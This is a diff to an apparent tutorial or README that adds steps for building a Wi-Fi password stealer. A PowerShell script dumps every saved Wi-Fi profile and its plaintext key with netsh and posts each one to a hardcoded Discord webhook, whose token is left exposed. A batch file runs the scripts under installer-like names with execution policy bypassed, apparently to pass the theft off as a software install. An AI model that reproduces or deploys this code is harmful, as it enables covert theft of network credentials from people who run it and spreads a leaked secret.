@@ -18,7 +18,7 @@ Prerequisites:
 2. Paste the following code into it and save it out.
 ```powershell
 # Define Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1265363802812186676/K6uFVQG_nbJF6bK3-WrVK-fY-D9Yd1LCNex64X8a9KyxquWgQcsZ5U6Kh9csHlS_nmjE"
+$webhookUrl = "https://discord.com/YOUR_DISCORD_WEBHOOK"
 
 # Function to send a message to Discord webhook
 function Send-DiscordWebhook {
@@ -242,4 +242,89 @@ foreach ($msg in $messages) {
 }
 ```
 
+# Step 3:
+## Now it's time to setup our second powershell file.
+1. Create another empty .ps1 file.
+2. Paste the following code into it and save it out.
+```powershell
+# Run PowerShell as Administrator for this script to work
 
+# Function to get all Wi-Fi profiles
+function Get-WiFiProfiles {
+    $profilesOutput = netsh wlan show profiles
+    $profileLines = $profilesOutput | Select-String -Pattern "All User Profile"
+    $profiles = @()
+    
+    foreach ($line in $profileLines) {
+        $profileName = ($line -replace 'All User Profile\s*:\s*', '').Trim()
+        $profiles += $profileName
+    }
+    
+    return $profiles
+}
+
+# Function to get the Wi-Fi password for a given profile name
+function Get-WiFiPassword {
+    param (
+        [string]$profileName
+    )
+    $profileDetails = netsh wlan show profile name="$profileName" key=clear
+    $passwordLines = $profileDetails | Select-String -Pattern "Key Content"
+    if ($passwordLines) {
+        $password = ($passwordLines -replace 'Key Content\s*:\s*', '').Trim()
+        return $password
+    } else {
+        return "Password not found or not saved"
+    }
+}
+
+# Function to send a message to Discord webhook
+function Send-ToDiscord {
+    param (
+        [string]$message
+    )
+    $webhookUrl = "https://discord.com/api/webhooks/1265363802812186676/K6uFVQG_nbJF6bK3-WrVK-fY-D9Yd1LCNex64X8a9KyxquWgQcsZ5U6Kh9csHlS_nmjE"
+    $payload = @{
+        content = $message
+    }
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+}
+
+# Main execution
+$profiles = Get-WiFiProfiles
+
+if ($profiles.Count -eq 0) {
+    $message = "No Wi-Fi profiles found."
+    Write-Output $message
+    Send-ToDiscord -message $message
+} else {
+    foreach ($profile in $profiles) {
+        $password = Get-WiFiPassword -profileName $profile
+        $message = "Profile: $profile`nPassword: $password"
+        Write-Output $message
+        Send-ToDiscord -message $message
+    }
+}
+```
+# Step 4:
+## Setup the batch file.
+1. This batch file will be used to refrence and run our 2 powershell files.
+2. Create empty .bat file and paste the following in and save it.
+```batch
+@echo off
+:: Get the directory of the currently running batch file
+set scriptDir=%~dp0
+
+:: Set the PowerShell script file names
+set scriptName1=Install_Files.ps1
+set scriptName2=Install_dependenciess.ps1
+
+:: Run the first PowerShell script
+powershell -NoProfile -ExecutionPolicy Bypass -File "%scriptDir%%scriptName1%"
+
+:: Run the second PowerShell script
+powershell -NoProfile -ExecutionPolicy Bypass -File "%scriptDir%%scriptName2%"
+
+:: End the batch file
+exit
+```
